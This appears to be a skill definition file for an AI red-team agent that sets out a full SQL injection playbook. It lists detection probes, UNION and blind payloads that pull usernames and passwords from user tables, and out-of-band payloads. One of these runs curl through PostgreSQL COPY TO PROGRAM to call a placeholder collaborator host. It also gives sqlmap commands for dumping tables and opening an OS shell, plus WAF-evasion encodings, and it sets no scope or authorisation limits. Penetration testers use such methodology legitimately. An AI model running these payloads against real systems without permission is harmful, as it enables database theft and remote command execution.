---
name: sqli-testing
description: Detect and exploit SQL injection vulnerabilities in web application parameters
origin: RedteamOpencode
---

# SQL Injection Testing

## When to Activate

- Parameter may reach a database query (search, login, filter, sort, ID lookup)
- Error messages reveal SQL backend (syntax errors, driver errors, stack traces)
- Numeric or string parameters in URLs, POST bodies, cookies, or headers
- API endpoints that accept structured queries or filter expressions

## Detection

### 1. Initial Probing

Inject these into each parameter one at a time. Watch for errors, behavioral changes, or time delays.

```
# String context
'
''
' OR '1'='1
' OR '1'='2
" OR "1"="1

# Numeric context
1 OR 1=1
1 OR 1=2
1 AND 1=1
1 AND 1=2

# Comment-based
' --
' #
') OR ('1'='1
```

### 2. Boolean-Based Detection

Compare responses between true and false conditions.

```
# True condition — should return normal content
?id=1 AND 1=1
?id=1' AND '1'='1

# False condition — should return different content
?id=1 AND 1=2
?id=1' AND '1'='2
```

If response length or content differs between true/false, boolean-based SQLi is confirmed.

### 3. Time-Based Detection

Use when no visible output difference exists.

```
# MySQL
' OR SLEEP(5)--
1 AND SLEEP(5)

# PostgreSQL
'; SELECT pg_sleep(5)--
1 AND (SELECT 1 FROM pg_sleep(5))

# MSSQL
'; WAITFOR DELAY '0:0:5'--

# SQLite
1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
```

Confirm by observing consistent response time differences.

### 4. Error-Based Detection

Trigger verbose database errors to extract information.

```
# MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--

# PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--

# MSSQL
' AND 1=CONVERT(int,(SELECT @@version))--
```

## Database Identification

Identify the backend from error messages or behavior.

| Database   | Error Pattern / Indicator                           |
|------------|-----------------------------------------------------|
| MySQL      | `You have an error in your SQL syntax`, `MariaDB`   |
| PostgreSQL | `unterminated quoted string`, `PSQLException`       |
| MSSQL      | `Unclosed quotation mark`, `Microsoft SQL`          |
| SQLite     | `SQLITE_ERROR`, `unrecognized token`                |
| Oracle     | `ORA-`, `quoted string not properly terminated`     |

Version queries:

```sql
-- MySQL
SELECT version()
SELECT @@version

-- PostgreSQL
SELECT version()

-- MSSQL
SELECT @@version

-- SQLite
SELECT sqlite_version()

-- Oracle
SELECT banner FROM v$version WHERE ROWNUM=1
```

## Exploitation

### 1. UNION-Based

```
# Find column count
' ORDER BY 1--
' ORDER BY 2--
# ... increment until error

# Find displayable columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

# Extract data (example with 3 columns, column 2 displayed)
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

### 2. Blind Boolean-Based

Extract data one character at a time.

```
# MySQL — extract first char of version
' AND SUBSTRING(version(),1,1)='5'--
' AND ASCII(SUBSTRING(version(),1,1))>52--

# Iterate character position and ASCII value
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--
```

### 3. Blind Time-Based

```
# MySQL
' AND IF(SUBSTRING(version(),1,1)='8',SLEEP(3),0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96,SLEEP(3),0)--

# PostgreSQL
' AND CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

### 4. Out-of-Band (OOB)

When no in-band output or timing is reliable.

```
# MySQL (requires FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.BURP_COLLAB_DOMAIN\\a'))--

# MSSQL (xp_dirtree)
'; EXEC master..xp_dirtree '\\BURP_COLLAB_DOMAIN\a'--

# PostgreSQL (COPY)
'; COPY (SELECT version()) TO PROGRAM 'curl http://BURP_COLLAB_DOMAIN/'--
```

Replace `BURP_COLLAB_DOMAIN` with your Burp Collaborator or interactsh domain.

## sqlmap Usage

```bash
# Basic detection and database enumeration
sqlmap -u "http://target/page?id=1" --batch --dbs --level 3 --risk 2

# With POST data
sqlmap -u "http://target/login" --data="user=a&pass=b" --batch --dbs

# With cookies/headers
sqlmap -u "http://target/page?id=1" --cookie="session=abc" --batch --dbs
sqlmap -u "http://target/api" --headers="Authorization: Bearer TOKEN" --batch --dbs

# Enumerate tables and columns
sqlmap -u "http://target/page?id=1" --batch -D dbname --tables
sqlmap -u "http://target/page?id=1" --batch -D dbname -T users --columns
sqlmap -u "http://target/page?id=1" --batch -D dbname -T users --dump

# Specific injection technique
sqlmap -u "http://target/page?id=1" --technique=BT --batch --dbs

# Through proxy (Burp)
sqlmap -u "http://target/page?id=1" --proxy="http://127.0.0.1:8080" --batch --dbs

# From saved request file
sqlmap -r request.txt --batch --dbs --level 3 --risk 2

# OS shell (if stacked queries + privileges)
sqlmap -u "http://target/page?id=1" --os-shell --batch
```

## WAF Bypass Techniques

```
# URL encoding
%27%20OR%20%271%27%3D%271

# Double URL encoding
%2527%2520OR%2520%25271%2527%253D%25271

# Case alternation
' uNiOn SeLeCt NULL,version(),NULL--

# Comment insertion
UN/**/ION SE/**/LECT NULL,version(),NULL--

# Inline comments (MySQL)
/*!50000UNION*/ /*!50000SELECT*/ NULL,version(),NULL--

# Whitespace alternatives
'%09OR%091=1--
'%0aOR%0a1=1--

# Concat/Char bypass for blocked strings
CONCAT(CHAR(117),CHAR(115),CHAR(101),CHAR(114),CHAR(115))  -- 'users'

# sqlmap tamper scripts
sqlmap -u "URL" --tamper=between,randomcase,space2comment --batch --dbs
```

## What to Record

- **Injection point:** parameter name, location (URL/POST/cookie/header), HTTP method
- **Injection type:** error-based, boolean-blind, time-blind, UNION, stacked, OOB
- **Database type and version:** exact version string
- **Extracted data:** database names, table names, credentials, sensitive records
- **Exact working payloads:** copy-paste reproducible
- **WAF/filter bypasses used:** what was blocked and how it was circumvented
- **Privilege level:** current DB user, DBA status, file read/write capability
- **Impact:** data access scope, potential for RCE (stacked queries, file write, UDF)
